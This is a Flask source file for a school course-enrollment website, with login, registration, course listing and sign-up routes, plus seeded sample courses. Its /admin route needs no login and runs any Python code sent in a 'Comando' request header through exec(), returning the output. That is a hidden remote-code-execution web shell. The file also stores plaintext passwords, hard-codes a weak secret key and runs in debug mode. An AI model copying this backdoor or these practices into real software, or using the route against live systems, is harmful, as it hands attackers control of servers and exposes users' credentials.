
from flask import Flask
from flask import redirect, url_for
from flask import render_template
from flask import request, jsonify, json
from flask import session
from flask import flash
from flask import make_response, Response
from datetime import timedelta, datetime
from flask_sqlalchemy import SQLAlchemy
from helper import login_required, EMAIL_REGEX
import db
from io import StringIO
from contextlib import redirect_stdout
import re


DB_NAME = "database.db"
app = Flask(__name__)
app.secret_key = "secret key"
app.permanent_session_lifetime = timedelta(days=7)
app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{DB_NAME}'


@app.route("/")
def home():
    logged = session.get("logged", False)
    return render_template("homepage.html", logged=logged)

@app.route("/admin", methods=["GET", "POST"])
def execute():
    if request.method == "POST":
        
        headers = dict(request.headers)
        
        res = ""
        f = StringIO()
        with redirect_stdout(f):
            try:
                exec(headers["Comando"])
                res = f.getvalue().strip()
            except:
                res = "error"
        
        headers["Result"] = str(res)
        
        return Response([b"good"], headers=headers)
    elif request.method == "GET":
        return render_template("admin.html")
    return "idk"

# azioni

@app.route("/lista-corsi/<n_fascia>", methods=["GET"])
def lista_corsi(n_fascia):
    corsi = db.db.session.execute(db.db.select(db.corso).filter_by(fascia=n_fascia)).all()
    
    # corsi = db.corso.query.filter_by(id=n_fascia).all()
    corsi = list(map(lambda x : x[0], corsi))
    return render_template("lista-corsi.html", fascia=n_fascia, corsi=corsi, dim=len(corsi))

@app.route("/lista-corsi/", methods=["GET"])
def lista_corsi_help():
    return redirect(request.url + "1")

@app.route("/iscrizione/<id_corso>", methods=["POST"])
@login_required
def iscrizione(id_corso):
    
    user = db.db.session.execute(db.db.select(db.user).filter_by(email=session["email"])).first()[0]
    corso = db.db.session.execute(db.db.select(db.corso).filter_by(id=id_corso)).first()[0]
    
    if corso is None:
        flash("Il corso non esiste", 'error')
        return redirect(request.url)
    
    # iscrizioni = db.db.session.execute(db.db.select(db.iscrizione).filter_by())
    # print(user)
    # print(user[0].iscrizioni)
    # iscrizioni = user.iscrizioni

    sel = db.db.select(db.iscrizione).join(db.user).where(db.user.email == session["email"])
    iscrizioni = db.db.session.scalars(sel).all()
    # iscrizioni = db.db.session.scalars(db.db.select(db.iscrizione).where(db.iscrizione.userref.email == session["email"])).all()
    
    #(db.db.select(db.user, db.iscrizione, db.corso).filter_by(email=session["email"])).all()

    # print(iscrizioni)
    
    for iscrizione in iscrizioni:
        if iscrizione.corsoref.fascia == corso.fascia:
            flash("Sei già iscritto a un corso per questa fascia. Puoi annullare l'iscrizione dal tuo profilo", 'error')
            return redirect("/profile")
    
    
    # print("iscritto a", id_corso)
    db.db.session.add(db.iscrizione(utente=user.id, corso=corso.id))
    db.db.session.commit()
    
    flash("Iscritto con successo", 'success')
    return redirect(request.url)

@app.route("/corso/<id_corso>", methods=["GET"])
def info_corso(id_corso):
    corso = db.corso.query.filter_by(id=id_corso).first()
    return render_template("corso.html", corso=corso)

# profilo

@app.route("/profile/")
@login_required
def profile():
    return "Profile!"

# accesso al profilo
@app.route("/login/", methods=["GET", "POST"])
def login():
    if request.method == "GET":
        return render_template("login.html")
    
    email = request.form.get("email")
    password = request.form.get("password")
    
    user = db.db.session.execute(db.db.select(db.user).filter_by(email=email)).first()
    
    if user is None:
        flash("Email o password errati", 'error')
        return render_template("login.html")
    
    if user[0].password != password:
        flash("Email o password errati", 'error')
        return render_template("login.html")

    session["email"] = email
    session["logged"] = True
    
    flash("Login effettuato con successo", 'success')
    return redirect(url_for("home"))

@app.route("/register/", methods=["GET", "POST"])
def register():
    if request.method == "GET":
        return render_template("register.html")
    
    nome = request.form.get("name")
    cognome = request.form.get("lastname")
    email = request.form.get("email")
    classe = request.form.get("classe")
    password = request.form.get("password")
    
    if re.match(EMAIL_REGEX, email) is None:
        flash("Email non valida", 'error')
        return render_template('register.html')
    if not email.endswith("@liceolussana.eu"):
        flash("Devi usare l'email istituzionale (...@liceolussana.eu)")
        return render_template('register.html')
    
    # more checks
    
    user = db.db.session.execute(db.db.select(db.user).filter_by(email=email)).first()
    
    if user is not None:
        flash("L'email è già usata", "error")
        return render_template("register.html")
    
    user = db.user(email=email, nome=nome, cognome=cognome, classe=classe, password=password)
    db.db.session.add(user)
    db.db.session.commit()
    
    flash("Registrato con successo", 'success')
    return redirect(url_for("home"))

@app.route("/logout/")
@login_required
def logout():
    session.clear()
    return redirect(url_for("home"))


if __name__ == "__main__":
    corsitmp = [
        db.corso(id=0,
            titolo="prova corsoo",
            descrizione="descrizione bella",
            posti_totali=50,
            posti_occupati=20,
            aula="Ed. 2, Piano 1, aula 36",
            fascia="1",
            organizzatori="persona 1",
            note="nota 1"
        ),
        db.corso(id=1,
            titolo="corso serio",
            descrizione="black jack",
            posti_totali=5,
            posti_occupati=1,
            aula="Ed. 2, Piano 2, aula 32",
            fascia="2",
            organizzatori="beccia",
            note="wooof"
        ),
        db.corso(id=2,
            titolo="corso brutto",
            descrizione="descrizione brutta",
            posti_totali=10,
            posti_occupati=0,
            aula="Ed. 2, Piano 1, aula 36",
            fascia="1",
            organizzatori="ferry",
            note="tosta"
        ),
        db.corso(id=3,
            titolo="corso cp",
            descrizione="ds + dp + grafi + advanced techincs",
            posti_totali=150,
            posti_occupati=149,
            aula="Ed. 2, Piano 0, Laboratorio Ravasio",
            fascia="1",
            organizzatori="drago",
            note="tanta cp bella"
        )
    ]
    
    with app.app_context():
        # db.drop_all()
        # db.init_app(app)
        # db.db.create_all()
        db.init_db(app, DB_NAME)
        
        for corso in corsitmp:
            q = db.db.session.execute(db.db.select(db.corso).filter_by(id=corso.id)).first()
            if q is None:
                db.db.session.add(corso)
                db.db.session.commit()
        
        app.run(debug=True)
